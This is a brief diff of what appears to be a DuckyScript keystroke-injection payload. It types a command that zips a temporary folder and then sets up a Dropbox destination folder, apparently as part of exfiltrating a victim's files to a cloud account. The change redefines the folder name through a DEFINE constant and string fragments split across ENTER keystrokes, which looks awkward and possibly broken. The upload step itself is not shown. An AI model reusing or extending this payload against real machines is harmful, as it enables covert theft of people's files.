@@ -62,7 +62,14 @@ REM Delay for zipping operation, it depends by computer power and folder directo
 STRING zip -r "$ZIP_PATH" "$TMP_FOLDER_PATH"
 DELAY 3000
 
-STRING DROPBOX_FOLDER="/$NAME"
+
+REM Set yout Dropbox folder name
+DEFINE DROPBOX_FOLDER_NAME example
+STRING DROPBOX_FOLDER="/
+ENTER
+STRING DROPBOX_FOLDER_NAME
+ENTER
+STRING "
 ENTER
 DELAY 500
 
